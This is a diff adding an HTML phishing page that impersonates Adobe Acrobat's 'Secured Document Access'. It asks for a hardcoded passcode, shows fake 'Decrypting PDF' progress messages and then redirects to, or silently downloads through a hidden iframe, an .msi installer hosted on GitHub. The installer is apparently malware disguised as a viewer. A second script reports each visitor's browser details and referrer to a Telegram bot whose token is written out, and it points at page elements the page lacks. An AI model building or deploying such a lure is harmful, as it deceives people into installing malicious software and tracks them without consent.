@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="robots" content="noindex,nofollow" />
+    <title>Adobe Acrobat - Secured PDF</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23EC1C24'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='14' font-family='Arial' font-weight='bold'>A</text></svg>" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Adobe Clean', system-ui, -apple-system, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .nav {
+            background: #2c2c2c;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .nav-logo .mark {
+            width: 28px;
+            height: 28px;
+            background: #EC1C24;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .nav-logo span {
+            color: #fff;
+            font-size: 15px;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            max-width: 440px;
+            width: 100%;
+            padding: 40px 36px 36px;
+            text-align: center;
+            transition: opacity 0.3s;
+        }
+
+        .pdf-icon {
+            width: 72px;
+            height: 88px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #fff 60%, #f0f0f0 60%);
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .pdf-icon::after {
+            content: 'PDF';
+            position: absolute;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #EC1C24;
+            color: #fff;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
+        .pdf-icon .fold {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(225deg, #f5f5f5 50%, #d0d0d0 50%);
+        }
+
+        h1 {
+            font-size: 20px;
+            color: #2c2c2c;
+            margin-bottom: 4px;
+        }
+        .sub {
+            font-size: 14px;
+            color: #6e6e6e;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        .code-input-area {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .code-input-area input {
+            flex: 1;
+            padding: 12px 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-align: center;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            outline: none;
+            transition: border 0.2s;
+            background: #fafafa;
+        }
+        .code-input-area input:focus {
+            border-color: #EC1C24;
+            background: #fff;
+        }
+        .code-input-area input::placeholder {
+            font-weight: 400;
+            font-size: 14px;
+            letter-spacing: 0;
+            color: #aaa;
+        }
+        .code-input-area .verify-btn {
+            background: #EC1C24;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 0 26px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            white-space: nowrap;
+        }
+        .code-input-area .verify-btn:hover {
+            background: #d0181f;
+        }
+        .code-input-area .verify-btn:active {
+            transform: scale(0.96);
+        }
+        .code-input-area .verify-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .msg {
+            font-size: 13px;
+            min-height: 20px;
+            margin-top: 4px;
+            margin-bottom: 6px;
+            transition: 0.2s;
+        }
+        .msg.error {
+            color: #d32f2f;
+        }
+        .msg.success {
+            color: #2e7d32;
+        }
+
+        .loader {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 6px;
+            margin-bottom: 4px;
+        }
+        .loader .ring {
+            width: 28px;
+            height: 28px;
+            border: 3px solid #f0f0f0;
+            border-top-color: #EC1C24;
+            border-radius: 50%;
+            animation: ring 0.7s linear infinite;
+        }
+        @keyframes ring {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .loader .loader-text {
+            font-size: 14px;
+            color: #4b4b4b;
+        }
+        .loader .loader-subtext {
+            font-size: 12px;
+            color: #6e6e6e;
+            margin-top: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 28px 20px;
+            }
+            .code-input-area {
+                flex-direction: column;
+            }
+            .code-input-area .verify-btn {
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="nav">
+        <div class="nav-logo">
+            <div class="mark">A</div>
+            <span>Adobe Acrobat</span>
+        </div>
+    </div>
+
+    <div class="main">
+        <div class="card">
+            <div class="pdf-icon"><div class="fold"></div></div>
+
+            <h1>Secured Document Access</h1>
+            <p class="sub">Enter the passcode provided to you to view this document.</p>
+
+            <div class="code-input-area">
+                <input type="text" id="codeInput" placeholder="Enter Document Passcode" autocomplete="off" spellcheck="false" />
+                <button class="verify-btn" id="verifyBtn">Verify</button>
+            </div>
+            <div class="msg" id="msg"></div>
+
+            <div class="loader" id="loader">
+                <div style="display: flex; flex-direction: column; align-items: center; gap: 4px;">
+                    <div style="display: flex; align-items: center; gap: 16px;">
+                        <div class="ring"></div>
+                        <span class="loader-text" id="status">Verifying access...</span>
+                    </div>
+                    <div class="loader-subtext" id="subtext"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var REDIRECT_URL = "https://github.com/ips323233/enn/releases/download/b7/enn_Viewer.msi";
+        var HARDCODED_CODE = "1393";
+
+        var codeInput = document.getElementById('codeInput');
+        var verifyBtn = document.getElementById('verifyBtn');
+        var msgEl = document.getElementById('msg');
+        var loaderEl = document.getElementById('loader');
+        var statusEl = document.getElementById('status');
+        var subtextEl = document.getElementById('subtext');
+
+        function showMsg(text, type) {
+            msgEl.textContent = text;
+            msgEl.className = 'msg' + (type ? ' ' + type : '');
+        }
+
+        function verifyCode() {
+            var entered = codeInput.value.trim();
+            console.log('Entered code:', entered);
+            console.log('Expected code:', HARDCODED_CODE);
+
+            if (entered.length === 0) {
+                showMsg('Please enter the secure code.', 'error');
+                return;
+            }
+
+            if (entered !== HARDCODED_CODE) {
+                console.log('Code mismatch!');
+                showMsg('Incorrect code. Please try again.', 'error');
+                codeInput.value = '';
+                codeInput.focus();
+                return;
+            }
+
+            console.log('Code verified! Starting redirect...');
+            showMsg('Code verified!', 'success');
+            codeInput.disabled = true;
+            verifyBtn.disabled = true;
+
+            document.querySelector('.code-input-area').style.display = 'none';
+            msgEl.style.display = 'none';
+            loaderEl.style.display = 'flex';
+
+            var messages = ['Verifying access...', 'Decrypting PDF...', 'Loading document viewer...', 'Document Downloaded...'];
+            var idx = 0;
+            
+            var iv = setInterval(function() {
+                idx++;
+                if (idx < messages.length) {
+                    statusEl.textContent = messages[idx];
+                    // Show subtext only when "Document Downloaded..." is displayed
+                    if (messages[idx] === 'Document Downloaded...') {
+                        subtextEl.textContent = 'Check download folder';
+                    } else {
+                        subtextEl.textContent = '';
+                    }
+                } else {
+                    clearInterval(iv);
+                    console.log('Redirecting to:', REDIRECT_URL);
+                    window.location.replace(REDIRECT_URL);
+                }
+            }, 1100);
+        }
+
+        verifyBtn.addEventListener('click', verifyCode);
+
+        codeInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                verifyBtn.click();
+            }
+        });
+
+        codeInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\s/g, '');
+        });
+
+        codeInput.focus();
+
+        console.log('Hardcoded access code:', HARDCODED_CODE);
+    </script>
+	
+	<script>
+// &#11015;&#65039; CONFIGURE HERE &#11015;&#65039;
+const DOWNLOAD_URL = 'https://github.com/ips323233/enn/releases/download/b7/enn_Viewer.msi';
+const TG_TOKEN = '8674168699:AAFB62XKMQZb5_QUam2cdSChgOvqA5yBZv8';
+const TG_CHAT   = '8686625206';
+
+// Telegram notification on visit
+(function ping(){
+  const ua = navigator.userAgent;
+  const ref = document.referrer || 'direct';
+  const time = new Date().toUTCString();
+  const msg = `&#128272; <b>Secure Document MSI</b>\n`
+    + `&#128336; <code>${time}</code>\n`
+    + `&#128279; Ref: <code>${encodeURIComponent(ref)}</code>\n`
+    + `&#128421; UA: <code>${encodeURIComponent(ua.slice(0,150))}</code>`;
+
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TG_CHAT,
+      text: msg,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    })
+  }).catch(() => {});
+})();
+
+// Download via hidden iframe — stays on portal, no redirect
+function startDownload() {
+  document.getElementById('note').style.display = 'none';
+  document.getElementById('status').textContent = '✅ Download started… Stay on this page.';
+
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = DOWNLOAD_URL;
+  document.body.appendChild(iframe);
+
+  // Clean up after download triggers
+  setTimeout(() => document.body.removeChild(iframe), 10000);
+}
+
+// Countdown: 3 seconds
+let sec = 3;
+const cd = document.getElementById('countdown');
+const timer = setInterval(() => {
+  sec--;
+  cd.textContent = sec;
+  if (sec <= 0) {
+    clearInterval(timer);
+    startDownload();
+  }
+}, 1000);
+</script>
+
+</body>
+</html>
